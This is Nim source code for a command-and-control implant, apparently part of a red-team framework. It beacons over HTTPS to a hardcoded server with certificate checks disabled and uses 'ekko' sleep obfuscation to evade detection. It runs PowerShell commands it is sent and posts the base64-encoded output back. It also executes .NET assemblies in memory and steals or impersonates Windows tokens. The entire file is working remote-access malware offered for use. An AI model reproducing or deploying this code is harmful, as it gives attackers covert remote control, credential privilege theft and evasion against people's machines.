import httpclient, base64, json, osproc, random, os, strutils, net
include ./libs_agent/executeass
include ./libs_agent/ekko
include ./libs_agent/steal_token

proc get_request_headers(url: string, api_key: string, identifier:string):string =
    let client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
    client.headers = newHttpHeaders(@[("X-Auth", api_key), ("Identifier", $identifier), ("Content-Type", "application/json"),("Accept","application/json")])
    let res = client.get(url)
    return res.body

proc post_request_headers(url: string, api_key: string, data: string, identifier:string):string =
    let json_command = $(%*{"command_output":data})
    let client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))
    client.headers = newHttpHeaders(@[("X-Auth", api_key), ("Identifier", $identifier), ("Content-Type", "application/json"),("Accept","application/json")])
    let res = client.post(url, body=json_command)
    return res.body

proc execute_command(command: string):string =
    var commandArgs : seq[string]
    commandArgs.add("-c")
    for element in command.split(" "):
        commandArgs.add(element)
    let (output,status_code) = execCmdEx(command, options={poUsePath, poStdErrToStdOut, poDaemon})
    let encoded_command = encode($output)
    return $encoded_command

proc random_sleep(sleep_time:int):int =
    return sleep_time*1000 + rand(sleep_time*1000)

proc main() =
    randomize()
    var secret_key = "RkRrcitEQ28hYTwsWGNpMWJfPGZAczJIT0Z0dXJMMilBdSpHXipqaENmTmU="
    var url = "https://192.168.79.73/"
    var identifier = $(int(rand(float(100000000000000000))))
    var sleep_time = 1
    #echo $(random_sleep(sleep_time))
    #echo $identifier
    while true:
        #sleep random_sleep(sleep_time)
        ekkoObf(random_sleep(sleep_time))
        var command_response = get_request_headers($url&"command",$secret_key,$identifier)
        if $command_response == "registration_error":
            var output = get_request_headers(url&"checkin",$secret_key,$identifier)
        else:
            if $command_response != "":
                var json_command = parseJson($command_response)
                var task_id = json_command["task_id"].getInt()
                #echo $task_id
                var module_method = json_command["method"].getStr()
                var method_arguments = json_command["arguments"].getStr()
                if $module_method == "psh":
                    var command_output = execute_command("powershell " & method_arguments)
                    var output_json = %*[{"task_id":task_id,"output":command_output}]
                    var output = post_request_headers(url&"output", $secret_key, $output_json, $identifier)
                elif $module_method == "execute-assembly":
                    var assembly_content = ""
                    var command_output = executeassembly(convertToByteSeq(assembly_content),[],$(int(rand(float(100000000000000000)))))
                    var output_json = %*[{"task_id":task_id,"output":encode(command_output)}]
                    var output = post_request_headers(url&"output", $secret_key, $output_json, $identifier)
                elif $module_method == "steal-token":
                    discard ImpersonateToken(parseInt(method_arguments))
                    var username = GetUser()
                    var output_json = %*[{"task_id":task_id,"output":encode("Impersonated: "&username)}]
                    var output = post_request_headers(url&"output", $secret_key, $output_json, $identifier)
                elif $module_method == "rev2self":
                    discard reverttoken()
                    var username = GetUser()
                    var output_json = %*[{"task_id":task_id,"output":encode("Reverting token to: "&username)}]
                    var output = post_request_headers(url&"output", $secret_key, $output_json, $identifier)
                elif $module_method == "whoami":
                    var username = GetUser()
                    var output_json = %*[{"task_id":task_id,"output":encode(username)}]
                    var output = post_request_headers(url&"output", $secret_key, $output_json, $identifier)

    #let output = execute_command("dir C:\\Users\\")
    #echo "command output :"
    #echo $output

    #let request_output = get_request_headers(url, api_key)
    #let post_output = post_request_headers(url, api_key, encoded_command)
    #echo $request_output
    #echo $post_output

when isMainModule:
    main()
